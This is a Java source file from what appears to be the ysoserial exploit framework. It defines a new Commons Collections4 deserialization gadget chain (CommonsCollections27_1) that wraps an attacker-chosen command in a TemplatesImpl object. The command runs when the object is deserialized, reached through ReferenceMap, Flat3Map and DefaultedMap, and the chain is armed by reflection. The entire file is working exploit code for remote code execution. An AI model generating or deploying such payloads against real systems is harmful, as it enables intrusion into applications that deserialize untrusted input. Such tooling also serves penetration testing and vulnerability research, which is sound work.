package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.map.*;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.ref.Reference;
import java.util.EnumMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/*
    Cluster5_20220605-162453, eleventh chain:
        Gadget chain:

			chain_ReferenceMap4-readObject-672224bdae7e38235da3cd937e8fda4ac04e0cd4.txt
				[
			 <org.apache.commons.collections4.map.ReferenceMap: void readObject(java.io.ObjectInputStream)>
			 <org.apache.commons.collections4.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
			 <org.apache.commons.collections4.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
			 <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
			 <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
			 <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
			 <org.apache.commons.collections4.keyvalue.TiedMapEntry: boolean equals(java.lang.Object)>
			 <java.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
			 <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
			 <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
			 <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
			]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections4:4.0"})
@Authors({ "BadagliaccaDaniele" })
public class CommonsCollections27_1 extends PayloadRunner implements ObjectPayload<ReferenceMap> {

    public ReferenceMap getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        org.apache.commons.collections4.functors.ConstantTransformer constant = new org.apache.commons.collections4.functors.ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        org.apache.commons.collections4.functors.ChainedTransformer chain = new org.apache.commons.collections4.functors.ChainedTransformer(new org.apache.commons.collections4.Transformer[] { constant, instantiate });

        ReferenceMap referenceMap = new ReferenceMap();

        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
        concurrentHashMap.put("yy", 1);
        org.apache.commons.collections4.functors.ConstantTransformer constantTransformer1 = new org.apache.commons.collections4.functors.ConstantTransformer(concurrentHashMap);
        Flat3Map flat3Map1 = new Flat3Map();
        //flat3Map1.put(constantTransformer1, 1);
        flat3Map1.put(concurrentHashMap, 1);

        ConcurrentHashMap wrapped = new ConcurrentHashMap();
        wrapped.put("zZ", 1);
        /*ConstantTransformer constantTransformer2 = new ConstantTransformer(wrapped);
        Flat3Map flat3Map2 = new Flat3Map();
        flat3Map2.put(constantTransformer2, 1);*/
        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map, org.apache.commons.collections4.Transformer>defaultedMap(wrapped, (org.apache.commons.collections4.Transformer<Integer,String>)chain);
        org.apache.commons.collections4.functors.ConstantTransformer constantTransformer2 = new org.apache.commons.collections4.functors.ConstantTransformer(defaultedMap);
        Flat3Map flat3Map2 = new Flat3Map();
        // comunque non passa per il constantTransformer.equals
        //flat3Map2.put(constantTransformer2, 1);
        flat3Map2.put(defaultedMap, 1);
        DefaultedMap<String,Integer> defaultedMap2 = (DefaultedMap) DefaultedMap.<Map, org.apache.commons.collections4.Transformer>defaultedMap(flat3Map2, (org.apache.commons.collections4.Transformer<Integer,String>)chain);


        referenceMap.put(flat3Map1, "b");
        referenceMap.put(defaultedMap2, "a");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        Reflections.setFieldValue(defaultedMap, "value", chain);


        return referenceMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections27_1.class, args);
    }

}
